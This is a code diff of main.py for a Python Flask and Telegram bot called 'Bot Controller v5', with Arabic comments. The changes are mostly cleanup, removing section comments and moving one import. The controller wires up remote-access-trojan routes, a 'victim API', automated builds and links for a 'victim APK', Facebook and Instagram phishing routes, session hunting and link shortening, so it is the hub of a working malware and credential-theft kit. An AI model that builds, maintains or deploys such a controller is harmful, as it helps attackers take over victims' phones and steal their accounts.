@@ -1,6 +1,6 @@
 # main.py
 # ============================================================
-# DEV 1 — Bot Controller v5 (مقسّم لملفات)
+# DEV 1 — Bot Controller v5
 # ============================================================
 
 import os
@@ -9,15 +9,13 @@ import threading
 import requests
 from flask import Flask, request, jsonify
 
-# ============================================================
-# استيراد الملفات الداخلية
-# ============================================================
 from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET
 from imports_manager import (
     rat_bp, qr_bp, lsh_bp, sh_bp, LSH_ENABLED, SH_ENABLED,
     init_facebook_routes, init_instagram_routes, init_rat_routes,
     init_qr_routes, init_lsh_routes, init_session_hunter_routes,
     set_bot_reference, register_payment_handlers,
+    lsh_push_command,
 )
 from utils import trigger_victim_apk_build, get_victim_apk_url
 from api_victim import init_victim_api
@@ -34,14 +32,8 @@ from bot_handlers import (
 from short_link import init_short_link
 from redis_cleaner import start_cleaner
 
-# ============================================================
-# إعداد Flask
-# ============================================================
 app = Flask(__name__)
 
-# ============================================================
-# Origin Gate
-# ============================================================
 ORIGIN_GATE_EXEMPT = ['/', '/health']
 
 
@@ -69,9 +61,6 @@ def health_check():
     return "DEV 1 Controller is running.", 200
 
 
-# ============================================================
-# تسجيل Blueprints
-# ============================================================
 if rat_bp:
     app.register_blueprint(rat_bp)
 if qr_bp:
@@ -81,9 +70,6 @@ if LSH_ENABLED and lsh_bp:
 if SH_ENABLED and sh_bp:
     app.register_blueprint(sh_bp)
 
-# ============================================================
-# Init Routes
-# ============================================================
 init_facebook_routes(app, bot)
 init_instagram_routes(app, bot)
 init_rat_routes(app, bot)
@@ -96,21 +82,9 @@ if LSH_ENABLED:
 
 register_payment_handlers(bot)
 
-# ============================================================
-# Victim API
-# ============================================================
 init_victim_api(app, bot)
 
-# ============================================================
-# Short Link
-# ============================================================
 init_short_link(app)
-
-
-# ============================================================
-# LSH — الرابط المُدخل
-# ============================================================
-from imports_manager import lsh_push_command
 
 
 @bot.message_handler(func=lambda m: m.chat.id in _pending_open_url
@@ -122,9 +96,6 @@ def handle_open_url(message):
         bot.send_message(message.chat.id, "✅ تم الإرسال" if ok else "❌ فشل")
 
 
-# ============================================================
-# تشغيل البوت
-# ============================================================
 def run_telegram_bot():
     print("[+] ============================================")
     print("[+] Starting Telegram Bot polling...")
@@ -166,10 +137,8 @@ def run_telegram_bot():
 
 
 if __name__ == "__main__":
-    # ★ شغّل Redis Cleaner
     start_cleaner()
     
-    # شغّل البوت
     bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
     bot_thread.start()
 
